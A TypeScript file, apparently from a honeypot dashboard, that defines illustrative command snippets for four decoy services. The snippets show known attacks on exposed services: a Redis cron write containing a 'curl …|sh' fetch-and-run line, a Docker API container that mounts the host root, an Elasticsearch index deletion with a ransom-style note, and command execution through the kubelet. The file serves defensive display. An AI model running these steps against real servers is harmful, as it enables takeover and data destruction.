import type { Port, PortCall } from '@/lib/decoys';

/**
 * What each fake service answers, shown on its page. Rebuilt by hand from the decoy's own yaml
 * (homelab decoys/configurations), never copied from a log: no attacker text ends up here.
 * `commands` is the technical name of each move, the same in every language.
 */
export type PortSnippet<P extends Port = Port> = {
  file: string;
  lines: string[];
  mark: number[];
  commands: Record<PortCall<P>, string>;
  /** The move that does the damage: its count gets its own step in the timeline. */
  key: PortCall<P>;
};

export const PORT_SNIPPETS: { [P in Port]: PortSnippet<P> } = {
  redis: {
    file: 'redis-cli',
    lines: [
      '> INFO server',
      'redis_version:7.2.4',
      '> CONFIG SET dir /var/spool/cron/crontabs',
      'OK',
      '> CONFIG SET dbfilename root',
      'OK',
      '> SET x "\\n*/1 * * * * curl …|sh\\n"',
      'OK',
      '> SAVE',
      'OK',
    ],
    mark: [2],
    commands: {
      ping: 'PING',
      auth: 'AUTH',
      info: 'INFO',
      recon: 'KEYS, GET, CONFIG GET',
      config: 'CONFIG SET',
      write: 'SET, DEL, SAVE, FLUSHALL',
      replicate: 'REPLICAOF, SLAVEOF',
      module: 'MODULE LOAD',
      lua: 'EVAL',
      other: '—',
    },
    key: 'config',
  },
  docker: {
    file: 'curl',
    lines: [
      '$ curl http://…:2375/version',
      '{"Version":"27.3.1","ApiVersion":"1.47",…}',
      '$ curl -X POST http://…:2375/containers/create \\',
      '    -d \'{"Image":"alpine","HostConfig":{"Binds":["/:/host"]}}\'',
      '{"Id":"4f1c…","Warnings":[]}',
      '$ curl -X POST http://…:2375/containers/4f1c…/start',
      'HTTP/1.1 204 No Content',
    ],
    mark: [2, 3],
    commands: {
      ping: 'GET /_ping',
      version: 'GET /version',
      info: 'GET /info',
      list: 'GET /containers/json',
      create: 'POST /containers/create',
      pull: 'POST /images/create',
      start: 'POST /containers/…/start',
      exec: 'POST /containers/…/exec',
      inspect: 'GET /containers/…/json, /logs',
      remove: 'DELETE /containers/…',
      scan: 'GET /, OPTIONS /',
      other: '—',
    },
    key: 'create',
  },
  elasticsearch: {
    file: 'curl',
    lines: [
      '$ curl http://…:9200/_cat/indices',
      'green open customers     …',
      'green open orders-2026.11 …',
      'green open logs-app      …',
      '$ curl -X DELETE http://…:9200/customers',
      '{"acknowledged":true}',
      "$ curl -X PUT http://…:9200/read_me/_doc/1 -d '{…}'",
      '{"result":"created",…}',
    ],
    mark: [4],
    commands: {
      info: 'GET /',
      health: 'GET /_cluster/health',
      list: 'GET /_cat/indices',
      search: 'GET /_search',
      script: '_search + script',
      write: 'PUT, POST /…/_doc',
      delete: 'DELETE /…',
      other: '—',
    },
    key: 'delete',
  },
  kubelet: {
    file: 'curl',
    lines: [
      '$ curl -k https://…:10250/pods',
      '{"kind":"PodList","items":[',
      '  kube-proxy, coredns, api-6c9f7b8d5-qx4lp, postgres-0 ]}',
      '$ curl -k -X POST https://…:10250/run/default/postgres-0/postgres \\',
      '    -d cmd=id',
      'HTTP/1.1 200 OK',
    ],
    mark: [3, 4],
    commands: {
      healthz: 'GET /healthz',
      pods: 'GET /pods',
      run: 'POST /run/…',
      exec: '/exec/…',
      logs: '/containerLogs/…',
      metrics: '/metrics, /stats',
      config: 'GET /configz',
      scan: 'GET /, /robots.txt, /favicon.ico',
      other: '—',
    },
    key: 'run',
  },
};
